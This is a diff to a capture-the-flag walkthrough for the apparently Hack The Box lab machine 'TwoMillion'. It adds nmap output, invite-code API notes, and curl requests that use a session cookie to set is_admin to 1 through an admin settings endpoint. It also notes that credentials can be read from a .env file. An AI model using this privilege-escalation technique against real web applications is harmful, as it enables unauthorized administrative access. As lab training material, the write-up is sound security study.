@@ -15,7 +15,16 @@ socialImage: "[[TwoMillion.png]]"
 # Solution
 ## Enumeration
 ```shell
-sudo nmap -sC 10.10.11.221
+$ sudo nmap -sC -v 10.10.11.221
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http
+|_http-title: Did not follow redirect to http://2million.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
 ```
 
 ```shell
@@ -86,3 +95,29 @@ while (c--) {
 }
 return p
 ```
+
+Scanning this shows the `makeInviteCode` function, which returns some encrypted data telling to make the request to `/api/v1/invite/generate`. This returns another encrypted code which can be used to login.
+
+On the `/access` page, the download, which triggers `/api/v1/user/vpn/generate`. Calling `/api/v1` shows all available endpoints, which can be used to escalate priveildegs
+
+```shell
+$ curl -b "PHPSESSID=5f1ddogh647j2410vfdcrkju8b" http://2million.htb/api/v1/admin/settings/update -X PUT -d '{"email": "admin@test.com", "is_admin": 1}' -H "Content-Type: application/json" | jq
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100     83   0     41 100     42    354    363                              0
+{
+  "id": 14,
+  "username": "admin",
+  "is_admin": 1
+}
+
+$ curl -b "PHPSESSID=5f1ddogh647j2410vfdcrkju8b" http://2million.htb/api/v1/admin/auth  | jq                                                                                      
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100     16   0     16   0      0    159      0                              0
+{
+  "message": true
+}
+```
+
+The `.env` file reveals a database with credentials, and the admin users password for ssh login.
